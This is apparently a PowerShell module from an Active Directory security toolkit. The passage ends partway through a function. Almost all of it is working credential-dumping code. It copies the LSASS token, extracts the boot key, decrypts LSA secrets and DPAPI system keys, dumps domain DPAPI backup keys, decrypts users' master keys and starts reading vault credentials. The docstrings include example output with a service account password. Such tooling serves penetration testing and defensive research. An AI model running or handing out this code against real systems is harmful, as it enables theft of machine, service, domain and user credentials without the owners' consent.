# This file contains functions for various Active Directory related operations

# Import the Native Methods dll
Add-Type -path "$PSScriptRoot\Win32Ntv.dll"

# Hash and encryption algorithms
$ALGS=@{
    0x00006603 = "3DES"
    0x00006609 = "3DES 112"
    0x00006611 = "AES"
    0x0000660e = "AES 128"
    0x0000660f = "AES 192"
    0x00006610 = "AES 256"
    0x0000aa03 = "AGREEDKEY ANY"
    0x0000660c = "CYLINK MEK"
    0x00006601 = "DES"
    0x00006604 = "DESX"
    0x0000aa02 = "DH EPHEM"
    0x0000aa01 = "DH SF"
    0x00002200 = "DSS SIGN"
    0x0000aa05 = "ECDH"
    0x0000ae06 = "ECDH EPHEM"
    0x00002203 = "ECDSA"
    0x0000a001 = "ECMQV"
    0x0000800b = "HASH REPLACE OWF"
    0x0000a003 = "HUGHES MD5"
    0x00008009 = "HMAC"
    0x0000aa04 = "KEA KEYX"
    0x00008005 = "MAC"
    0x00008001 = "MD2"
    0x00008002 = "MD4"
    0x00008003 = "MD5"
    0x00002000 = "NO SIGN"
    0xffffffff = "OID INFO CNG ONLY"
    0xfffffffe = "OID INFO PARAMETERS"
    0x00004c04 = "PCT1 MASTER"
    0x00006602 = "RC2"
    0x00006801 = "RC4"
    0x0000660d = "RC5"
    0x0000a400 = "RSA KEYX"
    0x00002400 = "RSA SIGN"
    0x00004c07 = "SCHANNEL ENC KEY"
    0x00004c03 = "SCHANNEL MAC KEY"
    0x00004c02 = "SCHANNEL MASTER HASH"
    0x00006802 = "SEAL"
    0x00008004 = "SHA1"
    0x0000800c = "SHA 256"
    0x0000800d = "SHA 384"
    0x0000800e = "SHA 512"
    0x0000660a = "SKIPJACK"
    0x00004c05 = "SSL2 MASTER"
    0x00004c01 = "SSL3 MASTER"
    0x00008008 = "SSL3 SHAMD5"
    0x0000660b = "TEK"
    0x00004c06 = "TLS1 MASTER"
    0x0000800a = "TLS1PRF"
}

# Gets the class name of the given registry key (can't be read with pure PowerShell)
# Mar 25th 2020
function Invoke-RegQueryInfoKey
{

    [CmdletBinding()]

    
    param(
        [Parameter(Mandatory=$true)]
        [Microsoft.Win32.RegistryKey]$RegKey
    )

    Process
    {
        # Create the StringBuilder and length to retrieve the class name
        $length = 255
        $name = New-Object System.Text.StringBuilder $length

        # LastWrite
        [int64]$lw=0

        $error = [AADInternals.Native]::RegQueryInfoKey(
            $RegKey.Handle,
            $name,         # ClassName
            [ref] $length, # ClassNameLength
            $null,         # Reserved
            [ref] $null,   # SubKeyCount
            [ref] $null,   # MaxSubKeyNameLength
            [ref] $null,   # MaxClassLength
            [ref] $null,   # ValueCount
            [ref] $null,   # MaxValueNameLength
            [ref] $null,   # MaxValueValueLength
            [ref] $null,   # SecurityDescriptorSize
            [ref] $lw      # LastWrite
        )

        if ($error -ne 0) {
            Throw "Error while invoking RegQueryInfoKey"
        }
        else {
            $hexValue = $name.ToString()
            if([String]::IsNullOrEmpty($hexValue))
            {
                Write-Error "RegQueryInfoKey: ClassName is empty"
            }
            else
            {
                return Convert-HexToByteArray $hexValue
            }
            
        }
    }
}

# Gets the boot key from the registry
# Mar 25th 2020
function Get-Bootkey
{
    [cmdletbinding()]
    Param()
    Process
    {
        # Get the current controlset 
        $cc = "{0:000}" -f (Get-ItemPropertyValue "HKLM:\SYSTEM\Select" -Name "Current")

        # Construct the bootkey
        $lsaKey = "HKLM:\SYSTEM\ControlSet$cc\Control\Lsa"
        $bootKey =  Invoke-RegQueryInfoKey (Get-Item "$lsaKey\JD")
        $bootKey += Invoke-RegQueryInfoKey (Get-Item "$lsaKey\Skew1")
        $bootKey += Invoke-RegQueryInfoKey (Get-Item "$lsaKey\GBG") 
        $bootKey += Invoke-RegQueryInfoKey (Get-Item "$lsaKey\Data")

        # Return the bootkey with the correct byte order
        $bootKeyBytes=@(
            $bootKey[0x08]
            $bootKey[0x05]
            $bootKey[0x04]
            $bootKey[0x02]
            $bootKey[0x0B]
            $bootKey[0x09]
            $bootKey[0x0D]
            $bootKey[0x03]
            $bootKey[0x00]
            $bootKey[0x06]
            $bootKey[0x01]
            $bootKey[0x0C]
            $bootKey[0x0E]
            $bootKey[0x0A]
            $bootKey[0x0F]
            $bootKey[0x07]
        )

        Write-Verbose "BootKey (SysKey): $((Convert-ByteArrayToHex -Bytes $bootKeyBytes).toLower())"

        return $bootKeyBytes
    }
}

# Gets the computer name
# Apr 24th 2020
function Get-ComputerName
{
    [cmdletbinding()]
    Param()
    Process
    {
        # Get the current controlset 
        $cc = Get-ItemPropertyValue "HKLM:\SYSTEM\Select" -Name "Current"

        # Construct the bootkey
        $computer = Get-ItemPropertyValue "HKLM:\SYSTEM\ControlSet00$cc\Control\ComputerName\ComputerName" -Name "ComputerName"

        Write-Verbose "ComputerName: $computer"
        
        return $computer
    }
}


# Gets the machine guid
# Mar 25th 2020
function Get-MachineGuid
{
    Process
    {
        $registryValue = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Cryptography" -Name "MachineGuid"

        return [guid] $registryValue.MachineGuid

    }
}

# Gets the DPAPI_SYSTEM keys
# Apr 23rd 2020
function Get-DPAPIKeys
{
<#
    .SYNOPSIS
    Gets DPAPI system keys

    .DESCRIPTION
    Gets DPAPI system keys which can be used to decrypt secrets of all users encrypted with DPAPI.
    MUST be run on a domain controller as an administrator

    .Example
    Get-AADIntDPAPIKeys

    UserKey               UserKeyHex                               MachineKey            MachineKeyHex                           
    -------               ----------                               ----------            -------------                           
    {16, 130, 39, 122...} 1082277ac85a532018930b782c30b7f2f91f7677 {226, 88, 102, 95...} e258665f0a016a7c215ceaf29ee1ae17b9f017b9

    .Example
    $dpapi_keys=Get-AADIntDPAPIKeys
#>
    [cmdletbinding()]
    Param()
    Process
    {
        $LSAsecrets = Get-LSASecrets -Users "DPAPI_SYSTEM"
        foreach($secret in $LSAsecrets)
        {
            if($secret.Name -eq "DPAPI_SYSTEM")
            {
                # Strip the first two DWORDs
                $key =        $secret.Password[4..$($secret.Password.Length-1)] 
                $userKey    = $key[0..19] 
                $machineKey = $key[20..39]
                $attributes=[ordered]@{
                    "UserKey" =       $userKey
                    "UserKeyHex" =    Convert-ByteArrayToHex -Bytes $userKey
                    "MachineKey" =    $machineKey
                    "MachineKeyHex" = Convert-ByteArrayToHex -Bytes $machineKey
                    }
                return New-Object psobject -Property $attributes
            }
        }
    }
}


# Decrypts the given data using the given key and InitialVector (IV)
# Apr 24th 2020
function Decrypt-LSASecretData
{
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [byte[]]$Data,
        [Parameter(Mandatory=$True)]
        [byte[]]$Key,
        [Parameter(Mandatory=$True)]
        [byte[]]$InitialVector
    )
    Process
    {
        # Create a SHA256 object 
        $sha256 = [System.Security.Cryptography.SHA256]::Create()

        # Derive the encryption key (first hash with the key, and then 1000 times with IV)
        $sha256.TransformBlock($Key,0,$Key.Length,$null,0) | Out-Null
        for($a = 0 ; $a -lt 999; $a++)
        {
            $sha256.TransformBlock($InitialVector,0,$InitialVector.Length,$null,0) | Out-Null
        }
        $sha256.TransformFinalBlock($InitialVector,0,$InitialVector.Length) | Out-Null
        $encryptionKey = $sha256.Hash

        # Create an AES decryptor
        $aes=New-Object -TypeName System.Security.Cryptography.AesCryptoServiceProvider
        $aes.Mode="ECB"
        $aes.Padding="None"
        $aes.KeySize = 256
        $aes.Key = $encryptionKey
        
        # Decrypt the data
        $dec = $aes.CreateDecryptor()
        $decryptedData = $dec.TransformFinalBlock($Data,0,$Data.Count)

        # return
        return $decryptedData

    }
}

# Parse LSA secrets Blob
# Apr 24th 2020
function Parse-LSASecretBlob
{
    [cmdletbinding()]
    Param(
    [Parameter(Mandatory=$True)]
        [byte[]]$Data
    )
    Process
    {
        $version =   [System.BitConverter]::ToInt32($Data[3..0], 0)
        $guid =      [guid][byte[]]($Data[4..19])
        $algorithm = [System.BitConverter]::ToInt32($Data, 20)
        $flags =     [System.BitConverter]::ToInt32($Data, 24)
        $lazyIv =    $Data[28..59]

        Write-Verbose "Key ID: $($guid.ToString())"

        New-Object -TypeName PSObject -Property @{
            "Version" =   $version
            "GUID" =      $guid
            "Algorighm" = $algorithm
            "Flags" =     $flags
            "IV" =        $lazyIv
            "Data" =      $Data[60..$($Data.Length)]
            }
    }
}

# Parse LSA password Blob
# Apr 24th 2020
function Parse-LSAPasswordBlob
{
    [cmdletbinding()]
    Param(
    [Parameter(Mandatory=$True)]
        [byte[]]$PasswordBlob
    )
    Process
    {
        # Get the size
        $BlobSize = [System.BitConverter]::ToInt32($PasswordBlob,0)
        
        # Get the actual data (strip the first four DWORDs)
        $Blob = $PasswordBlob[16..$(16+$BlobSize-1)]

        
        Write-Verbose "Password Blob: $(Convert-ByteArrayToHex -Bytes $Blob)"

        return $Blob
    }
}

# Parses LSA keystream
# Apr 24th 2020
function Parse-LSAKeyStream
{
    [cmdletbinding()]
    Param(
    [Parameter(Mandatory=$True)]
        [byte[]]$KeyStream
    )
    Process
    {
        # Get the stream size
        $streamSize = [System.BitConverter]::ToInt32($KeyStream,0)
        
        # Get the actual data (strip the first four DWORDs)
        $streamData = $KeyStream[16..$(16+$streamSize-1)]

        # Parse the keystream metadata
        $ksType = [System.BitConverter]::ToInt32($streamData[0..3], 0)
        $CurrentKeyID = [guid][byte[]]($streamData[4..19])
        Write-Verbose "Current LSA key Id: $($CurrentKeyID.ToString())"
        $ksType2 = [System.BitConverter]::ToInt32($streamData, 20)
        $ksNumKeys = [System.BitConverter]::ToInt32($streamData, 24)
        Write-Verbose "Number of LSA keys: $ksNumKeys"

        # Loop through the list of the keys, start right after the header information
        $pos=28
        $keys=@{}
        for($a = 0; $a -lt $ksNumKeys ; $a++)
        {
            $keyId = [guid][byte[]]($streamData[$pos..$($pos+15)])
            $pos+=16

            $keyType = [System.BitConverter]::ToInt32($streamData[$pos..$($pos+3)], 0)
            $pos+=4

            $keySize = [System.BitConverter]::ToInt32($streamData[$pos..$($pos+3)], 0)
            $pos+=4

            $keyBytes = [byte[]]($streamData[$pos..$($pos+$keySize-1)])
            $pos+=$keySize

            Write-Verbose "LSA Key $($a+1) Id:$($keyId.ToString()), $((Convert-ByteArrayToHex -Bytes $keyBytes).toLower())"

            $keys[$keyId.ToString()] = $keyBytes
        }

        return $keys
    }
}

# Gets LSA secrets
# Apr 24th 2020
function Get-LSASecrets
{
<#
    .SYNOPSIS
    Gets computer's LSA Secrets

    .DESCRIPTION
    Gets computer's Local Security Authority (LSA) secrets. MUST be run as an administrator.

    .Example
    Get-AADIntLSASecrets

    Name        : $MACHINE.ACC
    Password    : {1, 2, 3, 4...}
    PasswordHex : 01020304..
    PasswordTxt : 컓噖덭а劈－⌋결
    MD4         : {1, 2, 3, 4...}
    SHA1        : {1, 2, 3, 4...}
    MD4Txt      : aabbccdd..
    SHA1Txt     : aabbccdd..

    Name        : DPAPI_SYSTEM
    Password    : {1, 0, 0, 0...}
    PasswordHex : 0100000001082277ac85a532018930b782c30b7f2f91f7677e258665f0a016a7c215ceaf29ee1ae17b9f017b9
    PasswordTxt : 挌榵
    MD4         : {1, 2, 3, 4...}
    SHA1        : {1, 2, 3, 4...}
    MD4Txt      : aabbccdd..
    SHA1Txt     : aabbccdd..

    Name        : NL$KM
    Password    : {1, 2, 3, 4...}
    PasswordHex : 01020304..
    PasswordTxt : ⬡ꎛ
    MD4         : {1, 2, 3, 4...}
    SHA1        : {1, 2, 3, 4...}
    MD4Txt      : aabbccdd..
    SHA1Txt     : aabbccdd..

    Name        : _SC_ADSync
    Password    : {1, 2, 3, 4...}
    PasswordHex : 01020304..
    PasswordTxt : a5bTiGcvC8fr=E;MQ331IOt/&RP,!m:qjiRXaS;xr4V#6t74;&7mXWoOoz"57K/kKTz#xdBBqb.GDKly
    MD4         : {1, 2, 3, 4...}
    SHA1        : {1, 2, 3, 4...}
    MD4Txt      : aabbccdd..
    SHA1Txt     : aabbccdd..
#>
    [cmdletbinding()]
    Param(
        [Parameter(Mandatory=$False)]
        [String[]]$Users
        )
    Begin
    {
        $sha1Prov = New-Object System.Security.Cryptography.SHA1CryptoServiceProvider
    }
    Process
    {
        # First elevate the current thread by copying the token from LSASS.EXE
        if([AADInternals.Native]::copyLsassToken())
        {
            # 
            # Get the syskey a.k.a. bootkey
            #
            $syskey = Get-Bootkey
            
            #
            # Get the name and sid information
            #

            # Get the local name and sid
            $lnameBytes = Get-ItemPropertyValue "HKLM:\SECURITY\Policy\PolAcDmN" -Name "(default)"
            $LocalName = [text.encoding]::Unicode.GetString($lnameBytes[8..$($lnameBytes.Length)])
            $lsidBytes = Get-ItemPropertyValue "HKLM:\SECURITY\Policy\PolAcDmS" -Name "(default)"
            $LocalSid=(New-Object System.Security.Principal.SecurityIdentifier($lsidBytes,0)).Value

            # Get the domain name and sid
            $dnameBytes = Get-ItemPropertyValue "HKLM:\SECURITY\Policy\PolPrDmN" -Name "(default)"
            $DomainName = [text.encoding]::Unicode.GetString($dnameBytes[8..$($dnameBytes.Length)])
            $dsidBytes = Get-ItemPropertyValue "HKLM:\SECURITY\Policy\PolPrDmS" -Name "(default)"
            if($dsidBytes)
            {
                $DomainSid=(New-Object System.Security.Principal.SecurityIdentifier($dsidBytes,0)).Value
            }

            # Get the domain FQDN
            $fqdnBytes = Get-ItemPropertyValue "HKLM:\SECURITY\Policy\PolDnDDN" -Name "(default)"
            $DomainFQDN = [text.encoding]::Unicode.GetString($fqdnBytes[8..$($fqdnBytes.Length)])
            
            Write-Verbose "Local: $LocalName ($LocalSid)"
            Write-Verbose "Domain: $DomainName ($DomainSid)"
            Write-Verbose "FQDN: $DomainFQDN"
            
            #
            # Get the encryption key Blob
            #

            $encKeyBlob = Parse-LSASecretBlob -Data (Get-ItemPropertyValue "HKLM:\SECURITY\Policy\PolEKList" -Name "(default)")
            Write-Verbose "Default key: $($encKeyBlob.GUID)"
            
            # Decrypt the encryption key Blob using the syskey
            $decKeyBlob = Decrypt-LSASecretData -Data ($encKeyBlob.Data) -Key $syskey -InitialVector ($encKeyBlob.IV)

            # Parse the keys
            $encKeys = Parse-LSAKeyStream -KeyStream $decKeyBlob

            
            #
            # Get the password Blobs for each system account
            #

            # If users list not provided, retrieve all secrets
            if([string]::IsNullOrEmpty($Users))
            {
                $Users = Get-ChildItem "HKLM:\SECURITY\Policy\Secrets\" | select -ExpandProperty PSChildName
            }
            
            foreach($user in $Users)
            {
                # Return values
                $attributes=[ordered]@{}
                $md4=$null
                $sha1=$null
                $Md4txt=$null
                $Sha1txt=$null

                # Create the registry key
                $regKey = "HKLM:\SECURITY\Policy\Secrets\$user\CurrVal"

                if(Test-Path $regKey)
                {

                    # Get the secret Blob from registry
                    $pwdBlob = Parse-LSASecretBlob -Data (Get-ItemPropertyValue $regKey -Name "(default)")
                

                    # Decrypt the password Blob using the correct encryption key
                    $decPwdBlob = Decrypt-LSASecretData -Data ($pwdBlob.Data) -Key $encKeys[$($pwdBlob.GUID.ToString())] -InitialVector ($pwdBlob.IV)

                    # Parse the Blob
                    if($user.StartsWith("_SC_")) # Service accounts doesn't have password Blob - just dump the data after the header
                    {
                        $pwdb = $decPwdBlob[16..$($decPwdBlob.length-1)] 
                    }
                    else
                    {
                        $pwdb = Parse-LSAPasswordBlob -PasswordBlob $decPwdBlob
                    }
                

                    # Strip the first DWORD for DPAPI_SYSTEM
                    if($name -eq "DPAPI_SYSTEM")
                    {
                        $pwdb = $pwdb[4..$($pwdb.Length)]

                    }
                    else
                    {
                        $md4=Get-MD4 -bArray $pwdb -AsByteArray
                        $sha1 = $sha1Prov.ComputeHash($pwdb)

                        $md4txt =  Convert-ByteArrayToHex -Bytes $md4
                        $sha1txt = Convert-ByteArrayToHex -Bytes $sha1
                        Write-Verbose "MD4: $md4txt"
                        Write-Verbose "SHA1: $sha1txt"
                    }

                    # Add to return value
                    $attributes["Name"] =     $user
                    $attributes["Password"] = $pwdb
                    $attributes["PasswordHex"] = Convert-ByteArrayToHex -Bytes $pwdb
                    $attributes["PasswordTxt"] = ""
                    try{
                        $attributes["PasswordTxt"] = ([text.encoding]::Unicode.getString($pwdb)).trimend(@(0x00,0x0a,0x0d))
                    }
                    catch{}
                    $attributes["MD4"] =      $md4
                    $attributes["SHA1"] =     $sha1
                    $attributes["MD4Txt"] =  $md4txt
                    $attributes["SHA1Txt"] = $sha1txt

                    Write-Verbose "$($user): $(Convert-ByteArrayToHex -Bytes $pwdb)" -ErrorAction SilentlyContinue

                    New-Object psobject -Property $attributes
                }
                else
                {
                    Write-Error "No secrets found for user $user"
                }
            }

            
        }
        else
        {
            Write-Error "Could not copy LSASS.EXE token. MUST be run as administrator"
        }
    }
}

# Gets LSA secrets
# Apr 24th 2020
function Get-LSABackupKeys
{
    <#
    .SYNOPSIS
    Gets LSA backup keys

    .DESCRIPTION
    Gets Local Security Authority (LSA) backup keys which can be used to decrypt secrets of all users encrypted with DPAPI.
    MUST be run as an administrator

    .Example
    Get-AADIntLSABackupKeys

    certificate     Name   Id                                   Key                   
    -----------     ----   --                                   ---                   
    {1, 2, 3, 4...} RSA    e783c740-2284-4bd6-a121-7cc0d39a5077 {231, 131, 199, 64...}
                    Legacy ff127a05-51b1-4d45-8655-30c883631d90 {255, 18, 122, 5...}

    .Example
    $lsabk_keys=Get-AADIntLSABackupKeys
#>
    [cmdletbinding()]
    Param()
    Process
    {
        # First elevate the current thread by copying the token from LSASS.EXE
        if([AADInternals.Native]::copyLsassToken())
        {
            # Call the native method to retrive backupkeys
            $backupKeys=[AADInternals.Native]::getLsaBackupKeys();
        }
        else
        {
            Write-Error "Could not copy LSASS.EXE token. MUST be run as administrator"
            return
        }

        # Analyse and update the keys
        foreach($backupKey in $backupKeys)
        {
            
            if($bk=$backupKey.key)
            {
                # Get the version info (type of the key)
                $p=0;
                $version = [bitconverter]::ToInt32($bk,$p); $p+=4

                if($version -eq 2) # RSA privatekey
                {
                    $keyLen =  [bitconverter]::ToInt32($bk,$p); $p+=4
                    $certLen = [bitconverter]::ToInt32($bk,$p); $p+=4

                    # Extract the private key and certificate
                    $key=$bk[$p..$($p+$keyLen-1)]
                    $p+=$keyLen
                    $cert=$bk[$p..$($p+$certLen-1)]

                    # Create a private key header
                    $pvkHeader = @(
                        # Private key magic = 0xb0b5f11e == bob's file
                        0x1e, 0xf1, 0xb5, 0xb0
                        # File version = 0
                        0x00, 0x00, 0x00, 0x00 
                        # Key spec = 1
                        0x01, 0x00, 0x00, 0x00
                        # Encrypt type = 0
                        0x00, 0x00, 0x00, 0x00
                        # Encrypt data = 0
                        0x00, 0x00, 0x00, 0x00
                    )
                    $pvkHeader += [System.BitConverter]::GetBytes([int32]$keyLen)

                    # Construct the private key and update key object
                    $privateKey = $pvkHeader + $key
                    $backupKey.key = [byte[]]$privateKey

                    # Add certificate to key object
                    $backupKey | Add-Member -NotePropertyName "certificate" -NotePropertyValue $cert

                }
                elseif($version -eq 1) # Legacy key
                {
                    # Update the key object's key
                    $key = $bk[$p..$($bk.Length)]
                    $backupKey.key = $key
                }
            }
        }

        return $backupKeys
    }
}

# Gets the given user's DSAPI master keys
# Apr 25th 2020
function Get-UserMasterkeys
{
    <#
    .SYNOPSIS
    Gets user's master keys

    .DESCRIPTION
    Gets user's master keys using the password or system backup key (LSA backup key)

    .Example
    Get-AADIntUserMasterkeys -UserName "myuser" -SID "S-1-5-xxxx" -Password "password"

    Name                           Value
    ----                           -----
    ec3c7e8e-fb06-43ad-b382-8c5... {236, 60, 126, 142...}
    8a26d304-198c-4495-918f-77b... {166, 95, 5, 216...}

    .Example
    $lsabk_keys=Get-AADIntLSABackupKeys
    PS C:\>$rsa_key=$lsabk_keys | where name -eq RSA

    PS C:\>Get-AADIntUserMasterkeys -UserName "myuser" -SID "S-1-5-xxxx" -SystemKey $rsa_key.key
    
    Name                           Value
    ----                           -----
    ec3c7e8e-fb06-43ad-b382-8c5... {236, 60, 126, 142...}
    8a26d304-198c-4495-918f-77b... 

#>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [String]$UserName,
        [Parameter(Mandatory=$true)]
        [String]$SID,
        [Parameter(Mandatory=$true, ParameterSetName="password")]
        [String]$Password,
        [Parameter(Mandatory=$true, ParameterSetName="systemkey")]
        [byte[]]$SystemKey,
        [Parameter(Mandatory=$false)]
        [String]$UsersFolder="C:\Users"

    )
    Process
    {
        $retVal=@{}
        
        #$bSID=[System.Security.Principal.SecurityIdentifier]::new($SID)

        $keysPath="$UsersFolder\$userName\AppData\Roaming\Microsoft\Protect\$SID"

        $fileNames=Get-ChildItem -Path $keysPath -Hidden | select -ExpandProperty Name
        
        foreach($fileName in $fileNames)
        {
            $guid=$null
            try
            {
                $guid=[guid]$fileName
            }
            catch{}

            if($guid -ne $null)
            {
                Write-Verbose "Found masterkey file: $("$keysPath\$fileName")`n`n"
                $binMasterKey = Get-Content "$keysPath\$fileName" -Encoding Byte

                $mk = Parse-MasterkeyBlob -Data $binMasterKey

                if($SystemKey) # Decrypt using SystemKey
                {
                    if($mk.DomainKey)
                    {
                        $decKey = Decrypt-MasterkeyBlob -Systemkey $SystemKey -Data $mk.DomainKey
                    }
                }
                else
                {
                    $decKey = Decrypt-MasterkeyBlob -Data $mk.MasterKey -Password $Password -SID $SID -Salt $mk.MasterKeySalt -Iterations $mk.MasterKeyIterations -Flags $mk.MasterKeyFlags
                }

                $retVal[$mk.MasterKeyGuid] = $decKey

            }
        }

        return $retVal

    }
}

# Parses the given masterkey blob
# Apr 25th 2020
function Parse-MasterkeyBlob
{
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$Data

    )

    Process
    {
        # Parse the header
        $version =  [System.BitConverter]::ToInt32($Data,0)
        $guid =     [guid][text.encoding]::Unicode.GetString($Data[12..83])
        $flags =    [System.BitConverter]::ToInt32($Data,92)
        $mKeyLen =  [System.BitConverter]::ToInt64($Data,96)  # Master Key
        $bKeyLen =  [System.BitConverter]::ToInt64($Data,104) # Backup Key
        $crHisLen = [System.BitConverter]::ToInt64($Data,112) # Credential History
        $dKeyLen =  [System.BitConverter]::ToInt64($Data,120) # Domain Key

        Write-Verbose "Masterkey GUID:   $guid"
        Write-Verbose "Masterkey length: $mKeyLen"
        Write-Verbose "Backupkey length: $bKeyLen"
        Write-Verbose "CredHist  length: $crHisLen"
        Write-Verbose "Domainkey length: $dKeyLen`n`n"

        # Set the position
        $p = 128

        # Parse Master key Blob
        $mkVersion =   [System.BitConverter]::ToInt32($Data,$p+0)
        $mkSalt =      $Data[$($p+4)..$($p+19)]
        $mkRounds =    [System.BitConverter]::ToInt32($Data,$p+20)
        $mkHashAlg =   [System.BitConverter]::ToInt32($Data,$p+24)
        $mkCryptAlg =  [System.BitConverter]::ToInt32($Data,$p+28)
        $mkBytes =     $Data[$($p+32)..$($p+$mKeyLen-1)]

        Write-Verbose "MASTERKEY"
        Write-Verbose "Salt:      $(Convert-ByteArrayToHex -Bytes $mkSalt)"
        Write-Verbose "Rounds:    $mkRounds"
        Write-Verbose "Hash Alg:  $mkHashAlg $($ALGS[$mkHashAlg])"
        Write-Verbose "Crypt Alg: $mkCryptAlg $($ALGS[$mkCryptAlg])"
        Write-Verbose "Key:       $(Convert-ByteArrayToHex -Bytes $mkBytes)`n`n"

        # Set the position
        $p += $mKeyLen

        # Parse Backup key Blob
        $bkVersion =   [System.BitConverter]::ToInt32($Data,$p+0)
        $bkSalt =      $Data[$($p+4)..$($p+19)]
        $bkRounds =    [System.BitConverter]::ToInt32($Data,$p+20)
        $bkHashAlg =   [System.BitConverter]::ToInt32($Data,$p+24)
        $bkCryptAlg =  [System.BitConverter]::ToInt32($Data,$p+28)
        $bkBytes =     $Data[$($p+32)..$($p+$bKeyLen-1)]

        Write-Verbose "BACKUPKEY"
        Write-Verbose "Salt:      $(Convert-ByteArrayToHex -Bytes $bkSalt)"
        Write-Verbose "Rounds:    $bkRounds"
        Write-Verbose "Hash Alg:  $bkHashAlg $($ALGS[$bkHashAlg])"
        Write-Verbose "Crypt Alg: $bkCryptAlg $($ALGS[$bkCryptAlg])"
        Write-Verbose "Key:       $(Convert-ByteArrayToHex -Bytes $bkBytes)`n`n"

        # Set the position
        $p += $bKeyLen

        # Parse credential history
        if($crHisLen -gt 0)
        {
            $crVersion = [System.BitConverter]::ToInt32($Data,$p+0)
            $crGuid = [guid][byte[]]($Data[$($p+4)..$($p+19)])

            Write-Verbose "CREDENTIAL HISTORY"
            Write-Verbose "Guid:      $crGuid`n`n"
        }

        # Set the position
        $p += $crHisLen

        # There seems not to be domain key for domain admins?
        if($p -lt $Data.Length)
        {
            # Parse Domain key Blob
            $dkVersion =   [System.BitConverter]::ToInt32($Data,$p+0)
            $dkSecLen =    [System.BitConverter]::ToInt32($Data,$p+4)
            $dkAccLen=     [System.BitConverter]::ToInt32($Data,$p+8)
            $dkGuid =      [guid][byte[]]($Data[$($p+12)..$($p+27)])
            $dkBytes =     $Data[$($p+28)..$($p+28+$dkSecLen-1)]
            $dkAccBytes =  $Data[$($p+28+$dkSecLen)..$($p+28+$dkSecLen+$dkAccLen-1)]

            Write-Verbose "DOMAINKEY"
            Write-Verbose "Guid:        $dkGuid"
            Write-Verbose "Key:         $(Convert-ByteArrayToHex -Bytes $dkBytes)"
            Write-Verbose "Access Check:$(Convert-ByteArrayToHex -Bytes $dkAccBytes)`n`n"
        }
        # Create a return object
        $attributes = [ordered]@{
                "MasterKeyFlags" =      $flags
                "MasterKeyGuid" =       $guid
                "MasterKey" =           $mkBytes
                "MasterKeySalt" =       $mkSalt
                "MasterKeyIterations" = $mkRounds
                "MasterKeyHashAlg" =    $mkHashAlg
                "MasterKeyCryptAlg" =   $mkCryptAlg

                "BackupKey" =           $bkBytes
                "BackupKeySalt" =       $bkSalt
                "BackupKeyIterations" = $bkRounds
                "BackupKeyHashAlg" =    $bkHashAlg
                "BackupKeyCryptAlg" =   $bkCryptAlg

                "DomainKeyGuid" =       $dkGuid
                "DomainKey" =           $dkBytes
                "DomainKeyAC" =         $dkAccBytes

                "CredHistoryGuid" =     $crGuid
                }

                
        return New-Object PSObject -Property $attributes
    }
}

# Parses the given masterkey blob
# Apr 29th 2020
function Decrypt-MasterkeyBlob
{
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [byte[]]$Data,
        [Parameter(Mandatory=$true, ParameterSetName="password")]
        [byte[]]$Salt,
        [Parameter(Mandatory=$true, ParameterSetName="password")]
        [int]$Iterations,
        [Parameter(Mandatory=$true, ParameterSetName="password")]
        [String]$Password,
        [Parameter(Mandatory=$true, ParameterSetName="password")]
        [String]$SID,
        [Parameter(Mandatory=$true, ParameterSetName="systemkey")]
        [byte[]]$Systemkey,
        [Parameter(Mandatory=$true, ParameterSetName="password")]
        [String]$Flags,
        [Parameter(Mandatory=$false)]
        [bool]$Protected=$true
    )
    Begin
    {
        $sha = New-Object System.Security.Cryptography.SHA1CryptoServiceProvider
    }
    Process
    {
        if(!$SystemKey)
        {
            # Create the password hash 
            $md4 = [AADInternals.Native]::getHash(0x00008002 <#MD4#>,[text.encoding]::Unicode.GetBytes($Password))
            Write-Verbose "Password hash (MD4):  $(Convert-ByteArrayToHex -Bytes $md4)"
            $sha1 = [AADInternals.Native]::getHash(0x00008004 <#SHA_1#>,[text.encoding]::Unicode.GetBytes($Password))
            Write-Verbose "Password hash (SHA1): $(Convert-ByteArrayToHex -Bytes $sha1)"
        
            if($flags -band 4)
            {
                # SHA1
                $pwdHash = $sha1
            }
            else
            {
                # MD4
                $pwdHash = $md4
            }

            # If the account is protected, we need to get a new hash
            if($Protected)
            {
                # Convert SID to wide byte array
                $SIDbin = [text.encoding]::Unicode.getBytes($SID)

                $pwdHash = [AADInternals.Native]::getPBKDF2(0x0000800c <#SHA_256#>, $pwdHash, $SIDbin, 10000, 32)
                $pwdHash = [AADInternals.Native]::getPBKDF2(0x0000800c <#SHA_256#>, $pwdHash, $SIDbin,     1, 16)
            }
        
        
            Write-Verbose "Final user hash:      $(Convert-ByteArrayToHex -Bytes $pwdHash)"
        
            # Derive the key from the password hash and SID
            $derivedKey = [AADInternals.Native]::getHMAC(0x00008004 <#SHA_1#>,$pwdHash,[byte[]]($SIDbin+0+0)) # SID needs null terminators ♥ MS
            Write-Verbose "Derived key:          $(Convert-ByteArrayToHex -Bytes $derivedKey)`n`n"

            # Decode the masterkey using the derived key
            $decMasterKey = [AADInternals.Native]::getMasterkey($derivedKey, $Data, $Salt, $Iterations)

        }
        else
        {
            # Decode the masterkey using the provided System Key
            $decMasterKey = [AADInternals.Native]::getMasterkey($SystemKey,$Data)
        }

        Write-Verbose "Decrypted masterkey:  $(Convert-ByteArrayToHex -Bytes $decMasterKey)`n`n"
        
        return $decMasterKey
    }
}

# Gets the given user's credentials from the vault
# Apr 28th 2020
function Get-LocalUserCredentials
{
<#
    .SYNOPSIS
    Gets user's credentials from the local credential vault

    .DESCRIPTION
    Gets user's credentials from the local credential vault and decrypts them using the given masterkeys hashtable

    .Example
    Get-AADIntLocalUserCredentials -UserName user -MasterKeys $master_keys

    Target        : LegacyGeneric:target=msTeams_autologon.microsoftazuread-sso.com:443/user@company.com
    Persistance   : local_machine
    Edited        : 26/03/2020 10.12.11
    Alias         : 
    Comment       : 
    UserName      : 
    Secret        : {97, 115, 100, 102...}
    SecretTxt     : 獡晤晤
    SecretTxtUtf8 : asdfdf
    Attributes    : {}

    .Example
    $lsabk_keys=Get-AADIntLSABackupKeys
    PS C:\>$rsa_key=$lsabk_keys | where name -eq RSA

    PS C:\>$user_masterkeys=Get-AADIntUserMasterkeys -UserName "myuser" -SID "S-1-5-xxxx" -SystemKey $rsa_key.key

    PS C:\>Get-AADIntLocalUserCredentials -UserName "myuser" -MasterKeys $user_masterkeys
#>
    [CmdletBinding()]
